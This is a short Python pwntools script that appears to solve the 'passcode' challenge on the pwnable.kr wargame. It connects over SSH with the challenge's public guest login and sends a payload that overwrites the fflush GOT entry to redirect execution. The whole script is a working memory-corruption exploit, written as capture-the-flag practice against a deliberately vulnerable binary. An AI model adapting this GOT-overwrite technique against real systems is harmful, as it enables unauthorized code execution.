#!/usr/bin/env python
from pwn import *

buf = ""
buf += 'A' * 96		# offset to passcode1 
buf += '\x14\xc0\x04\x08\n'#str(p32(0x0804c014).decode('cp1252').encode('utf-8'))	# passcode1 pointing to fflush GOT entry
buf += str(0x080485e3)	# send as a number not an address

ssh = ssh(user='passcode', password='guest', host='pwnable.kr', port=2222)
p = ssh.process('./passcode')

p.sendline(buf.encode())
p.interactive()




